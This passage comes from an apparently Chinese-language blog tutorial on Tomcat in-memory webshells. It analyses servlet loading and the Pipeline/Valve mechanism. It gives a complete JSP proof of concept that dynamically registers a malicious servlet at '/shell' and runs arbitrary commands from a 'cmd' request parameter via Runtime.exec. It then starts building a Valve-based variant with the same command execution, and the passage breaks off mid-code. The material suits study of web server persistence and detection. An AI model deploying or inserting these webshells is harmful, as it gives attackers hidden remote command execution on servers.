class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<br>            &#125;<br></code></pre></td></tr></table></figure><p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p><p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-44.png" alt="img21"></p><p>至此Servlet才被加载到内存中。</p><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上文的分析我们能够总结出创建Servlet的流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h4 id="获取StandardContext对象-1"><a href="#获取StandardContext对象-1" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h4><p>StandardContext对象获取方式多种多样</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="编写恶意Servlet"><a href="#编写恶意Servlet" class="headerlink" title="编写恶意Servlet"></a>编写恶意Servlet</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="创建Wrapper对象"><a href="#创建Wrapper对象" class="headerlink" title="创建Wrapper对象"></a>创建Wrapper对象</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="将Wrapper添加进StandardContext"><a href="#将Wrapper添加进StandardContext" class="headerlink" title="将Wrapper添加进StandardContext"></a>将Wrapper添加进StandardContext</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>访问Servlet.jsp动态注册Servlet</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-45.png" alt="img22"></p><p>访问对应路径的Servlet命令执行</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-46.png" alt="img23"></p><p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><h4 id="什么是valve？"><a href="#什么是valve？" class="headerlink" title="什么是valve？"></a>什么是valve？</h4><p>在了解Valve之前，我们先来简单了解一下Tomcat中的<code>管道机制</code>。</p><p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p><p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p><p><img src="https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220218104446.png" alt="img24"></p><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p><h4 id="管道机制流程分析"><a href="#管道机制流程分析" class="headerlink" title="管道机制流程分析"></a>管道机制流程分析</h4><p>我们先来看看Pipeline接口，继承了Contained接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> Valve[] getValves();<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Pipeline接口提供了各种对Valve的操作方法，如我们可以通过<code>addValve()</code>方法来添加一个Valve。下面我们再来看看Valve接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6.jpg" alt="img25"></p><p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            ...<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request) req.getNote(ADAPTER_NOTES);<br>        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) res.getNote(ADAPTER_NOTES);<br> <br>        <span class="hljs-keyword">if</span> (request == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// Create objects</span><br>            request = connector.createRequest();<br>            request.setCoyoteRequest(req);<br>            response = connector.createResponse();<br>            response.setCoyoteResponse(res);<br> <br>            <span class="hljs-comment">// Link objects</span><br>            request.setResponse(response);<br>            response.setRequest(request);<br> <br>            <span class="hljs-comment">// Set as notes</span><br>            req.setNote(ADAPTER_NOTES, request);<br>            res.setNote(ADAPTER_NOTES, response);<br> <br>            <span class="hljs-comment">// Set query string encoding</span><br>            req.getParameters().setQueryStringCharset(connector.getURICharset());<br>        &#125;<br>...<br> <br>    <span class="hljs-keyword">try</span> &#123;<br>            ...<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);<br>            &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-47.png" alt="img26"></p><p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p><p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> first;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> basic;<br>    &#125;<br></code></pre></td></tr></table></figure><p>最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Select the Host to be used for this Request</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// HTTP 0.9 or HTTP 1.0 request without a host when no default host</span><br>            <span class="hljs-comment">// is defined.</span><br>            <span class="hljs-comment">// Don&#x27;t overwrite an existing error</span><br>            <span class="hljs-keyword">if</span> (!response.isError()) &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (request.isAsyncSupported()) &#123;<br>            request.setAsyncSupported(host.getPipeline().isAsyncSupported());<br>        &#125;<br> <br>        <span class="hljs-comment">// Ask this Host to process this request</span><br>        host.getPipeline().getFirst().invoke(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。</p><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>根据上文的分析我们能够总结出Valve型内存马的注入思路</p><ol><li>获取<code>StandardContext</code>对象</li><li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li><li>编写恶意Valve</li><li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li></ol><h5 id="获取StandardPipeline对象"><a href="#获取StandardPipeline对象" class="headerlink" title="获取StandardPipeline对象"></a>获取StandardPipeline对象</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br></code></pre></td></tr></table></figure><h5 id="编写恶意Valve类"><a href="#编写恶意Valve类" class="headerlink" title="编写恶意Valve类"></a>编写恶意Valve类</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h5 id="将恶意Valve添加进StandardPipeline"><a href="#将恶意Valve添加进StandardPipeline" class="headerlink" title="将恶意Valve添加进StandardPipeline"></a>将恶意Valve添加进StandardPipeline</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> 